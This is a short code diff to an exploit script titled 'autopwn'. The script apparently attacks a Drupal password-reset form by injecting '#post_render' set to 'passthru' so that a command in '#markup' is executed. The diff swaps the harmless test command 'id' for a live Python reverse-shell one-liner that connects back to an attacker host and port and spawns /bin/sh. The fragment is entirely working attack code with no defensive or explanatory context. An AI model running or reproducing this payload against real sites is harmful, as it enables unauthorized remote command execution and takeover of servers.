@@ -21,8 +21,8 @@ def banner(text="autopwn"):
 
 if __name__ == "__main__":
     banner()
-    # payload = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'".format(rhost, rport)
-    payload = "id"
+    payload = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'".format(rhost, rport)
+    # payload = "id"
     parameter = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':payload, 'name[#type]':'markup'}
     data = {'form_id':'user_pass', '_triggering_element_name':'name'}
 
